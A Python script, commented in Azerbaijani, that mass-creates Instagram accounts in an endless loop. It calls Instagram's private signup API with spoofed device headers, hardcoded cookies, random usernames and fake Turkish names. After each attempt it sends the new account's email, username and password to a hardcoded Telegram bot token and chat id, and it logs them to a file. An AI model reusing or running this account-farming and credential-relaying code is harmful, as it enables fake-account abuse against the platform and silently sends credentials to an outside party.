import requests, uuid, random, time, string
from colorama import Fore, init
init()

def send_to_telegram(email, username, password, user_id=None, sessionid=None, auth=None, suspended=False):
    BOT_TOKEN = "5535666970:AAElYXD67rI3cgv3Pa_RIicg-pXzvk_EQrw"  # @BotFather-dan token
    CHAT_ID = "1143980741" # Öz chat id
    status_text = "Hesab suspendlənib (doğrulama tələb olunur)!" if suspended else "Yeni Instagram hesabı yaradıldı:"
    text = f"""
{status_text}
Email: {email}
Username: `{username}`
Şifrə: `{password}`
"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=params)
    return response.status_code == 200

turk_adlari = [
    "Ahmet Yılmaz", "Mehmet Demir", "Ayşe Kaya", "Fatma Çelik",
    "Hasan Özkan", "Zeynep Şahin", "Mustafa Arslan", "Elif Korkmaz",
    "Hüseyin Koç", "Emine Yıldırım"
]

def rastgele_turk_adi():
    return random.choice(turk_adlari)

def random_string(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def make():
    passwordd = 'keno@R8484994'
    cookies = {
        'ig_did': '5C72BB73-7939-48C1-9F85-1B3EA1723F6D',
        'dpr': '2',
        'mid': 'aK-2xgABAAGFlH8s5ASyKX0chPqR',
        'csrftoken': 'gEBfgiHS4xJH3Wzn6PFXxE',
        'datr': 'DLivaDMocvP9eLfDkq1kKvXx',
        'wd': '360x436',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36 Instagram 275.0.0.27.98 Android (29/10; 320dpi; 720x1369; Xiaomi; Redmi 8A; olivelite; qcom; en_GB; 458229237)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'x-ig-app-id': '1217981644879628',
        'x-csrftoken': 'gEBfgiHS4xJH3Wzn6PFXxE',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/?next=https%3A%2F%2Fwww.instagram.com%2F%3F__coig_restricted%3D1',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'priority': 'u=1, i',
    }

    email = input("Email (real işləyən adres daxil edin): ")
    data = {'email': email,'jazoest': '22141',}
    requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', cookies=cookies, headers=headers, data=data)

    data = {'device_id': 'aK-2xgABAAGFlH8s5ASyKX0chPqR','email': email,'jazoest': '22141',}
    requests.post('https://www.instagram.com/api/v1/accounts/send_verify_email/', cookies=cookies, headers=headers, data=data)

    code = input("Kod (instagramdan gələn təsdiq kodunu daxil edin): ")
    data = {'code': code,'device_id': 'aK-2xgABAAGFlH8s5ASyKX0chPqR','email': email,'jazoest': '22141',}
    response = requests.post('https://www.instagram.com/api/v1/accounts/check_confirmation_code/', cookies=cookies, headers=headers, data=data)
    rc = response.json()["signup_code"]

    username = random_string(17)
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1756239703:{passwordd}',
        'email': email,
        'failed_birthday_year_count': '{}',
        'first_name': rastgele_turk_adi(),
        'username': username,
        'seamless_login_enabled': '1',
        'use_new_suggested_user_name': 'true',
        'jazoest': '22801',
    }
    requests.post('https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/', cookies=cookies, headers=headers, data=data)

    data = {'day': '26', 'month': '8', 'year': '1985', 'jazoest': '22801',}
    requests.post('https://www.instagram.com/api/v1/web/consent/check_age_eligibility/', cookies=cookies, headers=headers, data=data)

    data = {
        'email': email,
        'name': rastgele_turk_adi(),
        'jazoest': '22801',
    }
    requests.post('https://www.instagram.com/api/v1/web/accounts/username_suggestions/', cookies=cookies, headers=headers, data=data)

    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1756239703:{passwordd}',
        'day': '26',
        'email': email,
        'failed_birthday_year_count': '{}',
        'first_name': rastgele_turk_adi(),
        'month': '8',
        'username': username,
        'year': '1985',
        'client_id': 'aK-2xgABAAGFlH8s5ASyKX0chPqR',
        'seamless_login_enabled': '1',
        'tos_version': 'row',
        'force_sign_up_code': rc,
        'extra_session_id': ':bg25cy:569b65',
        'jazoest': '22801',
    }
    response = requests.post('https://www.instagram.com/api/v1/web/accounts/web_create_ajax/', cookies=cookies, headers=headers, data=data)

    if 'user_id":"' in response.text:
        auth = response.headers.get("ig-set-authorization", "Token yoxdur")
        now = time.strftime("%Y-%m-%d %H:%M:%S")

        auth_headers = {
            'User-Agent': headers['User-Agent'],
            'authorization': auth
        }
        check_resp = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', headers=auth_headers)

        if "/accounts/suspended/" in check_resp.text or "challenge_required" in check_resp.text:
            print(Fore.RED + f" [-] Hesab suspendlənib (doğrulama tələb olunur)! Tarix: {now}")
            send_to_telegram(email, username, passwordd, suspended=True)
        else:
            print(Fore.YELLOW + f" [-] Hesab uğurla yaradıldı. Tarix: {now}")
            print(" [+] Email:", email)
            print(" [+] Username:", username)
            print(" [+] Password:", passwordd)
            send_to_telegram(email, username, passwordd, suspended=False)

        with open("accounts-insta.txt", "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"""
Hesab statusu ({'suspended' if '/accounts/suspended/' in check_resp.text or 'challenge_required' in check_resp.text else 'aktiv'}): {now}
Email: {email}
Username: {username}
Password: {passwordd}
|============|
""")
    else:
        print(Fore.RED + " [-] Hesab yaradılmasında səhv oldu!")

    time.sleep(random.randint(4, 13))

while True:
    make()
